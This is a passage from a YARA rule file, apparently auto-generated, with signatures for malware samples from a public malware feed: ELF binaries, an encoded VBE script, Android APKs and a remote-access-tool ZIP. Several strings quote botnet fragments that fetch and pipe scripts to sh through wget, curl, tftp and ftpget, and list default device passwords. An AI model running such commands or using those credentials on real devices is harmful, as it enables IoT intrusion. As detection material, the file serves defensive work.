      $s9 = "x00\\x20\\x04\\x00\\x00\\x54\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\"\"\\x01\\x00\\x00\\x00" ascii
      $s10 = "\"\\x7F\\x45\\x4C\\x46\\x01\\x01\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x28\\x00\\x01\\x00\\x00\\x00\\xAC" ascii
      $s11 = "xFF\\xEB\\x01\\x10\\xA0\\xE3\\x00\\x70\\xA0\\xE1\"\"\\x06\\x20\\xA0\\xE1\\x02\\x00\\xA0\\xE3\\xD2\\xFF\\xFF\\xEB\\x01\\x00\\x70" ascii
      $s12 = "xE3\\x01\\x00\\xA0\\xE3\\xCF\\xFF\\xFF\\xEB\"\"\\x02\\xC0\\xA0\\xE3\\xBE\\x30\\xA0\\xE3\\x8E\\x10\\xA0\\xE3\\x35\\x20\\xA0\\xE3" ascii
      $s13 = "x00\\x32\\x00\\x00\\x00\\x4E\\x49\\x46\\x0A\\x00\\x00\\x00\\x00\\x47\\x45\\x54\\x20\"\"\\x2F\\x61\\x72\\x6D\\x37\\x20\\x48\\x54" ascii
      $s14 = "x01\\x00\"\"\\x74\\x04\\x01\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x51\\xE5\\x74" ascii
      $s15 = "1\\x00\"\"\\x74\\x04\\x01\\x00\\x10\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x06\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x07\\x00\\x00\\x" ascii
      $s16 = "x2F\\xE1\\x1B\\x01\\x00\\x00\"\"\\x04\\xE0\\x2D\\xE5\\x01\\xC0\\xA0\\xE1\\x02\\x30\\xA0\\xE1\\x00\\x10\\xA0\\xE1\\x04\\xD0\\x4D" ascii
      $s17 = "0\"\"\\xCC\\x04\\x00\\x00\\x02\\x00\\x00\\x04\\x34\\x00\\x20\\x00\\x04\\x00\\x28\\x00\\x07\\x00\\x06\\x00\\x01\\x00\\x00\\x00\\x" ascii
      $s18 = "x00\"\"\\x00\\x80\\x00\\x00\\x74\\x04\\x00\\x00\\x74\\x04\\x00\\x00\\x05\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x01\\x00\\x00\\x00" ascii
      $s19 = "x00\\x00\\xAA\\x01\\x00\\xA0\\xE3\\xD8\\x10\\x9F\\xE5\"\"\\x04\\x20\\xA0\\xE3\\xAD\\xFF\\xFF\\xEB\\x00\\x00\\x64\\xE2\\x84\\xFF" ascii
      $s20 = "3\\x0C\\x80\\xE1\"\"\\x1E\\xFF\\x2F\\xE1\\x04\\xE0\\x2D\\xE5\\x00\\x10\\xA0\\xE1\\x04\\xD0\\x4D\\xE2\\x01\\x00\\xA0\\xE3\\xAD\\x" ascii
   condition:
      uint16(0) == 0x5c22 and filesize < 20KB and
      8 of them
}

rule b91f55b530db1b5a057485bce47bd186c5d60aeda8f85393f4f3bb6c2b0d8b15 {
   meta:
      description = "evidences - file b91f55b530db1b5a057485bce47bd186c5d60aeda8f85393f4f3bb6c2b0d8b15.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-15"
      hash1 = "b91f55b530db1b5a057485bce47bd186c5d60aeda8f85393f4f3bb6c2b0d8b15"
   strings:
      $s1 = "4\\xEB\\x78\\x7C\\x65\\x1B\\x79\\x7F\\x83\\xE3\\x78\\x40\\x81\\x00\\x0C\"\"\\x4B\\xFF\\xFD\\xDD\\x4B\\xFF\\xFF\\xD8\\x7F\\xC3\\x" ascii
      $s2 = "0\\x10\\x38\\xA1\\x00\\x08\"\"\\x90\\x01\\x00\\x24\\x4C\\xC6\\x31\\x82\\x48\\x00\\x02\\x85\\x80\\x01\\x00\\x24\\x38\\x21\\x00\\x" ascii
      $s3 = "x38\\x21\\x00\\x10\"\"\\x7C\\x08\\x03\\xA6\\x4E\\x80\\x00\\x20\\x7C\\x08\\x02\\xA6\\x94\\x21\\xFF\\xF0\\x7C\\xA6\\x2B\\x78\\x90" ascii
      $s4 = "4\\x9C\"\"\\x10\\x01\\x04\\x9C\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x06\\x00\\x01\\x00\\x00\\x64\\x74\\xE5\\x" ascii
      $s5 = "x00\\x00\"\"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x06\\x00\\x00\\x00\\x04\\x54\\x84\\x80" ascii
      $s6 = "4\\x7C\\x08\\x02\\xA6\\x94\\x21\\xFF\\xE0\\xBF\\xA1\\x00\\x14\\x7C\\x7D\\x1B\\x78\"\"\\x90\\x01\\x00\\x24\\x48\\x00\\x00\\x21\\x" ascii
      $s7 = "\"\\x7F\\x45\\x4C\\x46\\x01\\x02\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x14\\x00\\x00\\x00\\x01\\x10" ascii
      $s8 = "x83\\xE3\\x78\\x4B\\xFF\\xFD\\x29\\x3C\\x80\\x10\\x00\\x38\\x84\\x04\\x94\"\"\\x38\\xA0\\x00\\x04\\x38\\x60\\x00\\x01\\x4B\\xFF" ascii
      $s9 = "0\\xBE\\x00\\x0C\\x38\\x60\\x00\\x01\\x4B\\xFF\\xFD\\xD5\"\"\\x7F\\xC3\\xF3\\x78\\x38\\x81\\x00\\x0C\\x38\\xA0\\x00\\x10\\x4B\\x" ascii
      $s10 = "x00\"\"\\x10\\x00\\x00\\x00\\x00\\x00\\x04\\x9C\\x00\\x00\\x04\\x9C\\x00\\x00\\x00\\x05\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x01" ascii
      $s11 = "x70\\x63\\x20\\x48\\x54\\x54\\x50\\x2F\\x31\\x2E\\x30\\x0D\\x0A\\x55\\x73\\x65\\x72\\x2D\"\"\\x41\\x67\\x65\\x6E\\x74\\x3A\\x20" ascii
      $s12 = "8\\x7C\\x05\\x03\\x78\"\"\\x7C\\x64\\x1B\\x78\\x38\\x60\\x00\\x05\\x4C\\xC6\\x31\\x82\\x48\\x00\\x02\\xC1\\x80\\x01\\x00\\x14\\x" ascii
      $s13 = "xB0\\x3B\\xA9\\x04\\x50\\x90\\x01\\x00\\xC4\"\"\\x48\\x00\\x00\\x08\\x3B\\xBD\\x00\\x01\\x88\\x1D\\x00\\x00\\x2F\\x80\\x00\\x00" ascii
      $s14 = "0\\x01\\x38\\x60\\x00\\x04\\x41\\x9E\\x00\\x08\\x4B\\xFF\\xFD\\x55\"\"\\x89\\x61\\x00\\x08\\x57\\xA9\\x40\\x2E\\x3C\\x00\\x0D\\x" ascii
      $s15 = "x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x19\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x03\"\"\\x10\\x01\\x04\\x9C" ascii
      $s16 = "B\\xFF\\xFC\\xE1\\x80\\x01\\x00\\xC4\\xBB\\x81\\x00\\xB0\\x38\\x21\\x00\\xC0\"\"\\x7C\\x08\\x03\\xA6\\x4E\\x80\\x00\\x20\\x4B\\x" ascii
      $s17 = "0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\"\\x00\\x00\\x00\\x00\\x00\\x" ascii
      $s18 = "3\\x23\\x78\"\"\\x54\\xA5\\x40\\x2E\\x7C\\x63\\x33\\x78\\x7C\\xA3\\x1B\\x78\\x4E\\x80\\x00\\x20\\x7C\\x08\\x02\\xA6\\x94\\x21\\x" ascii
      $s19 = "x21\\xFF\\xF0\\x7C\\xA6\\x2B\\x78\"\"\\x90\\x01\\x00\\x14\\x7C\\x80\\x23\\x78\\x7C\\x05\\x03\\x78\\x7C\\x64\\x1B\\x78\\x38\\x60" ascii
      $s20 = "x60\\x00\\x01\"\"\\x90\\x01\\x00\\x14\\x4C\\xC6\\x31\\x82\\x48\\x00\\x03\\x25\\x80\\x01\\x00\\x14\\x38\\x21\\x00\\x10\\x7C\\x08" ascii
   condition:
      uint16(0) == 0x5c22 and filesize < 20KB and
      8 of them
}

rule bb0b7b4a918df41ac7167d11640fd86ab1aa47906be2b40e25d924a251a7a984 {
   meta:
      description = "evidences - file bb0b7b4a918df41ac7167d11640fd86ab1aa47906be2b40e25d924a251a7a984.zip"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-15"
      hash1 = "bb0b7b4a918df41ac7167d11640fd86ab1aa47906be2b40e25d924a251a7a984"
   strings:
      $s1 = "remcmdstub.exe" fullword ascii
      $s2 = "folder/apprun.dll" fullword ascii
      $s3 = "PCICHEK.DLL" fullword ascii
      $s4 = "PCICL32.DLL" fullword ascii
      $s5 = "HTCTL32.DLL" fullword ascii
      $s6 = "settings/apprun.dll" fullword ascii
      $s7 = "EmbeddedBrowserWebView.dll" fullword ascii
      $s8 = "webmvorbisencoder.dll" fullword ascii
      $s9 = "webmmux.dll" fullword ascii
      $s10 = "TCCTL32.DLL" fullword ascii
      $s11 = "client32.exe" fullword ascii
      $s12 = "settings/avcodec-53.dll" fullword ascii
      $s13 = "folder/appcore.dll" fullword ascii
      $s14 = "folder/a3dapi.dll" fullword ascii
      $s15 = "folder/avcodec-53.dll" fullword ascii
      $s16 = "settings/avformat-53.dll" fullword ascii
      $s17 = "pcicapi.dll" fullword ascii
      $s18 = "settings/apprun.dllPK" fullword ascii
      $s19 = "webmvorbisencoder.dllPK" fullword ascii
      $s20 = "EmbeddedBrowserWebView.dllPK" fullword ascii
   condition:
      uint16(0) == 0x4b50 and filesize < 20000KB and
      8 of them
}

rule c66fdc532f236b599b2426db50d3e7917bd07f585d95118204b3a549922923bc {
   meta:
      description = "evidences - file c66fdc532f236b599b2426db50d3e7917bd07f585d95118204b3a549922923bc.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-15"
      hash1 = "c66fdc532f236b599b2426db50d3e7917bd07f585d95118204b3a549922923bc"
   strings:
      $s1 = "0\\x18\\x21\\x20\\x40\\x02\\x09\\xF8\\x20\\x03\\x00\\x00\\x00\\x00\\x10\\x00\\xBC\\x8F\"\"\\xF0\\xFF\\x00\\x10\\x00\\x00\\x00\\x" ascii
      $s2 = "x02\\x21\\x28\\x00\\x02\\x09\\xF8\\x20\\x03\\x80\\x00\\x06\\x24\\x10\\x00\\xBC\\x8F\"\"\\x21\\x28\\x00\\x02\\x48\\x80\\x99\\x8F" ascii
      $s3 = "D\\x0A\\x00\\x00\\x00\\x00\\x46\\x49\\x4E\\x0A\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"" ascii
      $s4 = "x06\\x24\\x10\\x00\\xBC\\x8F\\x00\\x00\\x00\\x00\\x54\\x80\\x99\\x8F\"\"\\x00\\x00\\x00\\x00\\x09\\xF8\\x20\\x03\\x23\\x20\\x10" ascii
      $s5 = "x32\\x06\\x00\"\"\\x25\\x30\\xC4\\x00\\x02\\x22\\x06\\x00\\x00\\xFF\\xC3\\x30\\x00\\x1A\\x03\\x00\\x00\\xFF\\x84\\x30\\x00\\x16" ascii
      $s6 = "C\\x00\\xB3\\x8F\\xB8\\x00\\xB2\\x8F\\xB4\\x00\\xB1\\x8F\\xB0\\x00\\xB0\\x8F\\x08\\x00\\xE0\\x03\"\"\\xC8\\x00\\xBD\\x27\\x05\\x" ascii
      $s7 = "x00\\x40\\x00\\x08\\x01\\x40\\x00\\x20\\x05\\x40\\x00\\x24\\x01\\x40\\x00\\x00\\x2E\\x73\\x68\\x73\\x74\\x72\\x74\\x61\\x62\\x00" ascii
      $s8 = "xA6\\x27\\x09\\xF8\\x20\\x03\"\"\\x03\\x00\\x05\\x24\\x10\\x00\\xBC\\x8F\\x28\\x00\\xBF\\x8F\\x00\\x00\\x00\\x00\\x08\\x00\\xE0" ascii
      $s9 = "0\\x2E\\x72\\x6F\\x64\\x61\\x74\\x61\\x00\\x2E\\x67\\x6F\\x74\\x00\\x2E\\x62\\x73\\x73\\x00\\x2E\\x6D\\x64\\x65\\x62\\x75\\x67" ascii
      $s10 = "0\\x00\\x00\\x04\\x00\\x00\\x00\\x1E\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\xC0\\x06\\x44\\x00\\xB4\\x06\\x00" ascii
      $s11 = "0\\x00\\x00\"\"\\xFF\\x00\\xA5\\x30\\x00\\x2C\\x05\\x00\\x00\\x26\\x04\\x00\\x25\\x20\\x85\\x00\\xFF\\x00\\xE7\\x30\\xFF\\x00\\x" ascii
      $s12 = "8\\x00\\xB0\\x8F\\xFF\\xFF\\x02\\x24\\x08\\x00\\xE0\\x03\\x20\\x00\\xBD\\x27\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\"\\x05\\x" ascii
      $s13 = "x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x23\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00" ascii
      $s14 = "x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xB4\\x06\\x00\\x00\\x31\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00" ascii
      $s15 = "0\"\"\\xE8\\x06\\x00\\x00\\x07\\x10\\x00\\x00\\x34\\x00\\x20\\x00\\x03\\x00\\x28\\x00\\x07\\x00\\x06\\x00\\x01\\x00\\x00\\x00\\x" ascii
      $s16 = "x28\\x00\\xBF\\xAF\\x10\\x00\\xBC\\xAF\"\"\\x5C\\x80\\x99\\x8F\\x18\\x00\\xA4\\xAF\\x1C\\x00\\xA5\\xAF\\x20\\x00\\xA6\\xAF\\x06" ascii
      $s17 = "x21\\xE0\\x99\\x03\\x21\\x00\\xE0\\x03\\x01\\x00\\x11\\x04\\x00\\x00\\x00\\x00\\x05\\x00\\x1C\\x3C\"\"\\x54\\x81\\x9C\\x27\\x21" ascii
      $s18 = "4\\x00\"\"\\x60\\x06\\x44\\x00\\x54\\x00\\x00\\x00\\x70\\x00\\x00\\x00\\x06\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x51\\xE5\\x74\\x" ascii
      $s19 = "0\\x25\\x80\\x43\\x00\\x0A\\x0D\\x02\\x3C\\x0A\\x0D\\x42\\x34\\xED\\xFF\\x02\\x16\"\"\\x00\\x00\\x00\\x00\\x38\\x80\\x99\\x8F\\x" ascii
      $s20 = "4\\x06\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00" ascii
   condition:
      uint16(0) == 0x5c22 and filesize < 20KB and
      8 of them
}

rule e2604e06a1d397760f22a668b48821dc20f06a8c3a28d165b9c96569b0e88bbb {
   meta:
      description = "evidences - file e2604e06a1d397760f22a668b48821dc20f06a8c3a28d165b9c96569b0e88bbb.vbe"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-15"
      hash1 = "e2604e06a1d397760f22a668b48821dc20f06a8c3a28d165b9c96569b0e88bbb"
   strings:
      $s1 = "\"Px, ,bx9P:\\InPxPZ#~v,." fullword wide
      $s2 = "/+c+2+XGRvXE*@#@&~~,P#p:\\,Jdr~,5K~1v]H55cJkJbb@#@&P,~PjpKt~E\\r~,InwsC1+c5:$1vI\\}I`J-E*#SPrkalO4ur~PrEm9WxYuE(6nUT5?rb@#@&PP,~" wide
      $s3 = "DdR;DnCD+`8b@#@&PP,~~P,Pc?Ol.O~W;x9CDHPx~r !+* !0O8" fullword wide
      $s4 = ":+,x'{@#@&w;UmDkKx~|PKI`b@#@&~P,P6U,2D.GMP]+k;s+~g+XY@#@&P,~PGkhPoAJKBPp\\" fullword wide
      $s5 = "IBPKt]F@#@&P,P~?nO,($Sh~',Z.nmY+68N+^YvEq?^MkaYRUt" fullword wide
      $s6 = "L}x$mYD+Db+k~',sCVk+@#@&,PP,~P,PRzssWSCmD[Kn.skUlDnP{PoC^/+@#@&,P~PAU9P" fullword wide
      $s7 = "UYGlUd\"+ordDDn`\"nTkdDDH|+H~,j+T:nxDfCOm#@#@&~P,P.5P\\P\"+TkdY.zn+z~,j+T:nUDflOC@#@&3x9~UE8@#@&@#@&B,'{xPA6" fullword wide
      $s8 = "\\nDDrD,+U~1lDC^D" fullword wide
      $s9 = "Dk6k1CYbWU/,/zdD" fullword wide
      $s10 = "o\"+CNce:AH`r*%WA*/Wf*/X2*1*2XWcXWflZc2Gl{ F " fullword wide
      $s11 = "2+cXZl&{*+FGy{cr##@#@&~P,P:H]|~x,($Sh I" fullword wide
      $s12 = "o]nmN`eP~1cJW0WA*;cG*Zl&Woc+***FcqXyc*l/cGv,+f{ +sF&" fullword wide
      $s13 = "FcXZl{vOv3" fullword wide
      $s14 = "3+GE#*@#@&,P~~nKne~{Pcp\\" fullword wide
      $s15 = "?1Dr2DR214W,J2M.nEMP=PEP'~xAPp,'PrPR~rP[~e5I" fullword wide
      $s16 = "hnxDP9+dP[G" fullword wide
      $s17 = "n/,x'{@#@&o!xmOrKx~5:$g`BIpq#@#@&P,~PGkhP~SP#BP(tK}BP" fullword wide
      $s18 = "nP]~,Sj5t@#@&@#@&P~P,$S:.~x,JJ~v,qUkDrmVrk+MPVmP14l" fullword wide
      $s19 = "kEsOmY@#@&~P,PsK.~(tn\\PxPq~:W~S" fullword wide
      $s20 = "*P?OnaP+@#@&~,P~,P,P" fullword wide
   condition:
      uint16(0) == 0xfeff and filesize < 40KB and
      8 of them
}

rule e9a10947b709f8367ebd66d05d37a5acdc63365ef536164cde2b928e62068fff {
   meta:
      description = "evidences - file e9a10947b709f8367ebd66d05d37a5acdc63365ef536164cde2b928e62068fff.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-15"
      hash1 = "e9a10947b709f8367ebd66d05d37a5acdc63365ef536164cde2b928e62068fff"
   strings:
      $s1 = "x05\\xC0\\x00\\x40\\x01\\x9C\\x00\\x40\\x02\\x10\\x00\\x40\\x05\\x70\\x00\\x40\\x01\\x28\\x00\\x40\\x01\\x74\\x00\\x40\\x00\\xA0" ascii
      $s2 = "x1C\\x27\\xBD\\xFF\\xE0\\xAF\\xA8\\x00\\x10\\xAF\\xA9\\x00\\x14\\xAF\\xAA\\x00\\x18\\xAF\\xA2\\x00\\x1C\"\"\\x8F\\xA2\\x00\\x1C" ascii
      $s3 = "x0F\\x00\\x40\\x80\\x21\\x8F\\x85\\x80\\x18\\x8F\\x99\\x80\\x48\"\"\\x24\\xA5\\x05\\xF4\\x24\\x04\\x00\\x01\\x03\\x20\\xF8\\x09" ascii
      $s4 = "\"\\x7F\\x45\\x4C\\x46\\x01\\x02\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x08\\x00\\x00\\x00\\x01\\x00" ascii
      $s5 = "3\\x20\\x00\\x08\"\"\\x24\\x04\\x0F\\xA1\\x3C\\x1C\\x00\\x05\\x27\\x9C\\x85\\x4C\\x03\\x99\\xE0\\x21\\x8F\\x99\\x80\\x5C\\x00\\x" ascii
      $s6 = "0\\x00\\x07\\x00\\x00\\x80\\x21\\x8F\\x99\\x80\\x54\\x00\\x00\\x00\\x00\"\"\\x03\\x20\\xF8\\x09\\x24\\x04\\x00\\x03\\x8F\\xBC\\x" ascii
      $s7 = "0\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"" ascii
      $s8 = "x10\\x8F\\x82\\x80\\x18\\x00\\x00\\x00\\x00\"\"\\x24\\x50\\x05\\xE0\\x82\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x14\\x40\\xFF\\xFD" ascii
      $s9 = "4\\x00\\xB9\\x24\\x05\\x00\\x8E\\x24\\x06\\x00\\x35\"\"\\x03\\x20\\xF8\\x09\\xA7\\xA2\\x00\\x1E\\x8F\\xBC\\x00\\x10\\x24\\x05\\x" ascii
      $s10 = "\"\\x7F\\x45\\x4C\\x46\\x01\\x02\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x08\\x00\\x00\\x00\\x01\\x00" ascii
      $s11 = "xB0\\x00\\x18\\x24\\x02\\xFF\\xFF\\x03\\xE0\\x00\\x08\\x27\\xBD\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\"\\x3C\\x1C" ascii
      $s12 = "0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x06\\x94\\x00\\x00\\x00\\x31\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" ascii
      $s13 = "0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" ascii
      $s14 = "x24\\x05\\x00\\x01\\x8F\\xBC\\x00\\x10\"\"\\x8F\\xBF\\x00\\x28\\x00\\x00\\x00\\x00\\x03\\xE0\\x00\\x08\\x27\\xBD\\x00\\x30\\x3C" ascii
      $s15 = "8\\x09\\x24\\x05\\x00\\x03\"\"\\x8F\\xBC\\x00\\x10\\x8F\\xBF\\x00\\x28\\x00\\x00\\x00\\x00\\x03\\xE0\\x00\\x08\\x27\\xBD\\x00\\x" ascii
      $s16 = "0\\x00\\x00\\x8F\\x99\\x80\\x54\\x00\\x00\\x00\\x00\\x03\\x20\\xF8\\x09\\x24\\x04\\x00\\x05\"\"\\x8F\\xBC\\x00\\x10\\x8F\\xBF\\x" ascii
      $s17 = "x2E\\x72\\x6F\\x64\\x61\\x74\\x61\\x00\\x2E\\x67\\x6F\\x74\\x00\\x2E\\x62\\x73\\x73\\x00\\x2E\\x6D\\x64\\x65\\x62\\x75\\x67\\x2E" ascii
      $s18 = "4\\x05\\x00\\x02\\x00\\x00\\x30\\x21\\x03\\x20\\xF8\\x09\"\"\\x00\\x40\\x90\\x21\\x00\\x40\\x88\\x21\\x24\\x02\\xFF\\xFF\\x8F\\x" ascii
      $s19 = "0\\x00\\x00\\x05\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x11\\x00" ascii
      $s20 = "F\\xFF\\x8F\\x85\\x80\\x18\\x8F\\x82\\x80\\x18\"\"\\x8F\\x99\\x80\\x48\\x24\\xA5\\x05\\xE8\\x24\\x04\\x00\\x01\\x24\\x06\\x00\\x" ascii
   condition:
      uint16(0) == 0x5c22 and filesize < 20KB and
      8 of them
}

/* Super Rules ------------------------------------------------------------- */

rule _40fa63e6cca94a31978559b76c87f41aaf4df55b239dc0b23b0db98b1ba7e52d_4a520bf34e7734933ac14eb4dbf06163b9821e7e48ce55a0f6ce944310_0 {
   meta:
      description = "evidences - from files 40fa63e6cca94a31978559b76c87f41aaf4df55b239dc0b23b0db98b1ba7e52d.apk, 4a520bf34e7734933ac14eb4dbf06163b9821e7e48ce55a0f6ce9443109dd39b.apk"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-15"
      hash1 = "40fa63e6cca94a31978559b76c87f41aaf4df55b239dc0b23b0db98b1ba7e52d"
      hash2 = "4a520bf34e7734933ac14eb4dbf06163b9821e7e48ce55a0f6ce9443109dd39b"
   strings:
      $s1 = "22Base.Widget.AppCompat.Button.ButtonBar.AlertDialog" fullword ascii
      $s2 = "00Base.Widget.AppCompat.CompoundButton.RadioButton" fullword ascii
      $s3 = "Fazer login com o Google" fullword ascii
      $s4 = "11RtlOverlay.Widget.AppCompat.Search.DropDown.Icon1" fullword ascii
      $s5 = "&&Widget.AppCompat.ButtonBar.AlertDialog" fullword ascii
      $s6 = "11Widget.AppCompat.Light.Spinner.DropDown.ActionBar" fullword ascii
      $s7 = "++Base.Widget.AppCompat.ButtonBar.AlertDialog" fullword ascii
      $s8 = "11RtlOverlay.Widget.AppCompat.Search.DropDown.Icon2" fullword ascii
      $s9 = "11Base.TextAppearance.AppCompat.Widget.DropDownItem" fullword ascii
      $s10 = "11RtlOverlay.Widget.AppCompat.Search.DropDown.Query" fullword ascii
      $s11 = "00RtlOverlay.Widget.AppCompat.Search.DropDown.Text" fullword ascii
      $s12 = ",,RtlOverlay.Widget.AppCompat.DialogTitle.Icon" fullword ascii
      $s13 = "--Widget.AppCompat.Button.ButtonBar.AlertDialog" fullword ascii
      $s14 = "--Base.Widget.AppCompat.CompoundButton.CheckBox" fullword ascii
      $s15 = "((Widget.AppCompat.CompoundButton.CheckBox" fullword ascii
      $s16 = "++Base.Widget.AppCompat.CompoundButton.Switch" fullword ascii
      $s17 = "!!abc_action_bar_elevation_material" fullword ascii
      $s18 = "++Widget.AppCompat.CompoundButton.RadioButton" fullword ascii
      $s19 = "&&Widget.AppCompat.CompoundButton.Switch" fullword ascii
      $s20 = "Fazer login" fullword ascii
   condition:
      ( uint16(0) == 0x4b50 and filesize < 17000KB and ( 8 of them )
      ) or ( all of them )
}

rule _39cde17eb1eacd24c8ec0ddbf996ccdc02af9a1deb3e121f053a15053721e3f9_6e9b0e8423f09c4d85e1e358a6a6f66f78f8e20f354a36de4c5e990445_1 {
   meta:
      description = "evidences - from files 39cde17eb1eacd24c8ec0ddbf996ccdc02af9a1deb3e121f053a15053721e3f9.elf, 6e9b0e8423f09c4d85e1e358a6a6f66f78f8e20f354a36de4c5e9904459e9ae0.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-15"
      hash1 = "39cde17eb1eacd24c8ec0ddbf996ccdc02af9a1deb3e121f053a15053721e3f9"
      hash2 = "6e9b0e8423f09c4d85e1e358a6a6f66f78f8e20f354a36de4c5e9904459e9ae0"
   strings:
      $s1 = "/wget.sh -O- | sh;/bin/busybox tftp -g " fullword ascii
      $s2 = " -r tftp.sh -l- | sh;/bin/busybox ftpget " fullword ascii
      $s3 = "tluafed" fullword ascii /* reversed goodware string 'default' */
      $s4 = "User-Agent: Wget" fullword ascii
      $s5 = "/bin/busybox wget http://" fullword ascii
      $s6 = "/proc/%s/cmdline" fullword ascii
      $s7 = " ftpget.sh ftpget.sh && sh ftpget.sh;curl http://" fullword ascii
      $s8 = "xirtam" fullword ascii /* reversed goodware string 'matrix' */
      $s9 = "linuxshell" fullword ascii
      $s10 = "/curl.sh -o- | sh" fullword ascii
      $s11 = "/bin/busybox hostname FICORA" fullword ascii
      $s12 = "admintelecom" fullword ascii
      $s13 = "/bin/busybox echo -ne " fullword ascii
      $s14 = "solokey" fullword ascii
      $s15 = "telecomadmin" fullword ascii
      $s16 = "supportadmin" fullword ascii
      $s17 = "GET /dlr." fullword ascii
      $s18 = "usage: busybox" fullword ascii
      $s19 = "wabjtam" fullword ascii
      $s20 = "zhongxing" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _39cde17eb1eacd24c8ec0ddbf996ccdc02af9a1deb3e121f053a15053721e3f9_6e9b0e8423f09c4d85e1e358a6a6f66f78f8e20f354a36de4c5e990445_2 {
   meta:
      description = "evidences - from files 39cde17eb1eacd24c8ec0ddbf996ccdc02af9a1deb3e121f053a15053721e3f9.elf, 6e9b0e8423f09c4d85e1e358a6a6f66f78f8e20f354a36de4c5e9904459e9ae0.elf, dcf6a3230b7c59438178c49328e2800be52f8bbeddc814dde6415d0f5a15176e.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-15"
      hash1 = "39cde17eb1eacd24c8ec0ddbf996ccdc02af9a1deb3e121f053a15053721e3f9"
      hash2 = "6e9b0e8423f09c4d85e1e358a6a6f66f78f8e20f354a36de4c5e9904459e9ae0"
      hash3 = "dcf6a3230b7c59438178c49328e2800be52f8bbeddc814dde6415d0f5a15176e"
   strings:
      $s1 = "Remote I/O error" fullword ascii
      $s2 = "Protocol error" fullword ascii /* Goodware String - occured 26 times */
      $s3 = "Protocol not supported" fullword ascii /* Goodware String - occured 73 times */
      $s4 = "Connection refused" fullword ascii /* Goodware String - occured 127 times */
      $s5 = "Broken pipe" fullword ascii /* Goodware String - occured 742 times */
      $s6 = "Permission denied" fullword ascii /* Goodware String - occured 823 times */
      $s7 = "npxXoudifFeEgGaACScs" fullword ascii
      $s8 = "No XENIX semaphores available" fullword ascii
      $s9 = "Structure needs cleaning" fullword ascii
      $s10 = "hlLjztqZ" fullword ascii
      $s11 = "Not a XENIX named type file" fullword ascii
      $s12 = "Wrong medium type" fullword ascii
      $s13 = "Unknown error " fullword ascii /* Goodware String - occured 1 times */
      $s14 = "Is a named type file" fullword ascii
      $s15 = "Interrupted system call should be restarted" fullword ascii
      $s16 = "Streams pipe error" fullword ascii /* Goodware String - occured 2 times */
      $s17 = "Invalid cross-device link" fullword ascii /* Goodware String - occured 3 times */
      $s18 = "RFS specific error" fullword ascii /* Goodware String - occured 3 times */
      $s19 = "File descriptor in bad state" fullword ascii /* Goodware String - occured 3 times */
